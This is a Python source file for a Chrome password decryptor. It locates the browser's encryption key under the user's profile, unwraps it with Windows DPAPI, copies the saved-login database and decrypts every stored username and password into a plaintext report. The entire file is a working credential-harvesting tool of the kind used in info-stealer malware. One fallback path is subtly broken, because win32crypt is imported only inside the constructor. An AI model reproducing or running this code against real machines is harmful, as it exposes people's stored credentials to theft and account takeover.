import os
import json
import base64
import sqlite3
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

class chrome_decryptor:
    def __init__(self, vendor="Google", browser="Chrome"):
        try:
            import win32crypt
        except:
            pass
        self.browser = browser
        self.vendor = vendor
        self.details = f"passwords decrypted from {self.browser}\n"
        local_computer_directory_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData",
            "Local",
            self.vendor,
            self.browser,
            "User Data",
            "Local State",
        )
        with open(local_computer_directory_path, "r") as f:
            local_state_data = json.loads(f.read())

        encryption_key = base64.b64decode(
            local_state_data["os_crypt"]["encrypted_key"]
        )[5:]
        self.key = win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    def chrome_date_and_time(self, chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    def password_decryption(self, password):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(self.key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(
                    win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
                )
            except:
                return "No Password"

    def output(self):
        db_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData",
            "Local",
            self.vendor,
            self.browser,
            "User Data",
            "default",
            "Login Data",
        )
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used"
        )

        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = self.password_decryption(row[3])
            date_of_creation = row[4]
            last_usuage = row[5]

            if user_name or decrypted_password:
                self.details += f"Main URL: {main_url}\n"
                self.details += f"Login URL: {login_page_url}\n"
                self.details += f"User name: {user_name}\n"
                self.details += f"Decrypted Password: {decrypted_password}\n"

            else:
                continue

            if date_of_creation != 86400000000 and date_of_creation:
                self.details += f"Creation date: {str(self.chrome_date_and_time(date_of_creation))}\n"

            if last_usuage != 86400000000 and last_usuage:
                self.details += (
                    f"Last Used: {str(self.chrome_date_and_time(last_usuage))}\n"
                )

            self.details += "\n"

        cursor.close()
        db.close()

        try:
            os.remove(filename)
        except:
            pass

        return self.details
